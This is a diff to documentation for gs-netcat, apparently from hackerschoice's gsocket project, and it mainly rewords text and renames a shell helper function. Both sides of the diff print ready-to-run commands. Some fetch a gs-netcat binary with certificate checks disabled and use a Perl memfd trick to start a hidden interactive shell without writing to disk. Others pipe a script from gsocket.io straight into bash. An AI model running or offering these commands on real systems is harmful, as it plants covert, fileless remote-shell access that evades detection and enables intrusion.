@@ -158,7 +158,7 @@ Useful environment variables:
 |GS_WEBHOOK_KEY=|Report to webhook.site|
 |TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|
 
-Alternatively, start gs-netcat without the binary touching the remote file system:
+Alternatively, start gs-netcat without the binary touching the remote file system (will not survive a reboot):
 
 <div class="tabs-wrapper">
     <div class="tabs" style="height: 12.45rem;">
@@ -179,15 +179,15 @@ curl -SsfLk https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/
 wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_PORT=53 GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"'
 {% endhighlight %}
             </div>
-        </div>
-    </div>
-</div>
+        </div></div></div>
 
-- *GS_PORT=53* is only needed if port 443 is firewalled.
 - Change `ChangeMe` to your own secret. Don't use `ChangeMe`.
+- *GS_PORT=53* is only needed if port 443 is firewalled.
 
-Your last resort is to download and start gs-netcat manually:
-Download the static binary from [https://github.com/hackerschoice/gsocket/releases/latest/](https://github.com/hackerschoice/gsocket/releases/latest). There also is an (unsupported) [Windows binary](https://github.com/hackerschoice/binary/blob/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip) or use [qsocket.io](https://www.qsocket.io/) and start it manually with `/tmp/gs-netcat -ilD -s ChangeMe`.
+Your last resort is to [download the static binary](https://github.com/hackerschoice/gsocket/releases/latest) and start gs-netcat manually. There also is an (unsupported) [Windows binary](https://github.com/hackerschoice/binary/blob/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip) or use [qsocket.io](https://www.qsocket.io/).
+{% highlight shell %}
+/tmp/gs-netcat -ilD -s ChangeMe
+{% endhighlight %}
 
 {:refdef: style="text-align: center;"}
 ## Advanced Tips & Tricks
@@ -221,7 +221,7 @@ Remembering many secrets from many deployments is cumbersome. It is easier to re
 
 {% highlight sh %}
 # cut & paste this into your shell on your workstation or add to ~/.bashrc
-gssec() {
+gsx() {
     [ -z "$GS_SEED" ] && { echo >&2 "Please type: GS_SEED=MySuperStrongMasterSeed"; return 255; }
     str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
     str="${str:0:22}"
@@ -230,14 +230,14 @@ gssec() {
     echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL https://gsocket.io/y)"'
     echo "ACCESS: gs-netcat -s ${str} -i"
 }
-gsnc() { local s=$(gssec "$1"); [ -z "$s" ] && return 255; gs-netcat -i -s "$s"; }
+gsnc() { local s=$(gsx "$1"); [ -z "$s" ] && return 255; gs-netcat -i -s "$s"; }
 {% endhighlight %}
 {% highlight sh %}
 # Set a Master Seed:
 GS_SEED="ThisIsMySecretMasterSeed"
 
 # Show commands to deploy on 'alice.com'
-gssec alice.com
+gsx alice.com
 
 # Connect to 'alice.com'
 gsnc alice.com
